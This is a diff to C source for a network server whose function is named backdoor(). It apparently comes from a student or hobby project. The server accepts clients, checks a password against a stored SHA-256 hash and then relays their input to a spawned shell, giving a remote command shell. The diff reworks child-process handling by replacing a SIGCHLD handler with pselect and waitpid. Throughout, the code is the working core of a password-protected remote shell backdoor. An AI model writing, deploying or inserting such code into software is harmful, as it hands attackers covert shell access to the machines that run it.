@@ -2,44 +2,21 @@
 
 t_serv		serv;
 
-void	zombie_hunter(int sig)
-{
-	(void)sig;
-	int status;
-	pid_t pid = wait(&status);
-	t_client *client = NULL;
-	for (int i = 0; i < MAX_CLIENTS; i++)
-	{
-		if (serv.clients[i].shell_pid == pid)
-		{
-			client = &serv.clients[i];
-			break ;
-		}
-	}
-	if (client)
-	{
-		kill(client->supervisor_pid, SIGINT);
-		client->supervisor_pid = -1;
-		close(client->fd_shell);
-		client->fd_shell = -1;
-		client->shell_pid = -1;
-		if (send_str(client->fd, "$> ") < 0)
-			remove_client(&serv, client->fd);
-	}
-}
-
 void	reset_client(t_client *client)
 {
+	int status;
+
 	close(client->fd);
-	if (client->shell_pid >= 0)
-		kill(client->shell_pid, SIGINT);
-	if (client->supervisor_pid >= 0)
-		kill(client->supervisor_pid, SIGINT);
+	if (client->output_pid >= 0)
+	{
+		kill(client->output_pid, SIGINT);
+		waitpid(client->output_pid, &status, 0);
+	}
 	client->fd = -1;
 	client->logged = false;
 	client->fd_shell = -1;
 	client->shell_pid = -1;
-	client->supervisor_pid = -1;
+	client->output_pid = -1;
 }
 
 void	remove_client(t_serv *serv, int fd)
@@ -77,15 +54,17 @@ void	backdoor(void)
 	for (int i = 0; i < MAX_CLIENTS; i++)
 	{
 		serv.clients[i].shell_pid = -1;
-		serv.clients[i].supervisor_pid = -1;
+		serv.clients[i].output_pid = -1;
 		reset_client(&serv.clients[i]);
 	}
 	int fd_max = serv.sockfd;
-	signal(SIGCHLD,zombie_hunter);
+	sigset_t mask;
+	sigemptyset(&mask);
+	sigaddset(&mask, SIGCHLD);
 	while (true)
 	{
 		serv.fd_read = serv.fd_master;
-		select(fd_max + 1, &serv.fd_read, NULL, NULL, NULL);
+		pselect(fd_max + 1, &serv.fd_read, NULL, NULL, NULL, &mask);
 		int fd = 0;
 		while (fd < fd_max + 1)
 		{
@@ -139,7 +118,21 @@ void	backdoor(void)
 						}
 						if (client)
 						{
-							if (!client->logged || client->shell_pid == -1)
+							if (client->logged && client->output_pid >= 0) // client in shell
+							{
+								int status;
+								int result = waitpid(client->output_pid, &status, WNOHANG);
+								if (!result)
+									write(client->fd_shell, buffer, len_read);
+								else // died or error
+								{
+									close(client->fd_shell);
+									client->fd_shell = -1;
+									client->shell_pid = -1;
+									client->output_pid = -1;
+								}
+							}
+							if (!client->logged || client->output_pid == -1) // client not in shell
 							{
 								char *msg = buffer;
 								char *end = memchr(buffer, '\n', len_read);
@@ -153,7 +146,7 @@ void	backdoor(void)
 										char *hash = sha256(msg, strlen(msg));
 										if (!strcmp(hash, HASHED_PWD))
 										{
-											if (send_str(client->fd, "$> ") < 0)
+											if (send_str(client->fd, PROMPT) < 0)
 											{
 												remove_client(&serv, fd);
 												break ;
@@ -173,9 +166,9 @@ void	backdoor(void)
 									else if (client->logged)
 									{
 										launch_command(&serv, fd, msg);
-										if (client->logged && client->shell_pid == -1)
+										if (client->logged && client->output_pid == -1)
 										{
-											if (send_str(fd, "$> ") < 0)
+											if (send_str(fd, PROMPT) < 0)
 											{
 												remove_client(&serv, fd);
 												break ;
@@ -197,9 +190,6 @@ void	backdoor(void)
 									*end = '\0';
 								}
 							}
-							else
-								write(client->fd_shell, buffer, len_read);
-							break ;
 						}
 					}
 				}
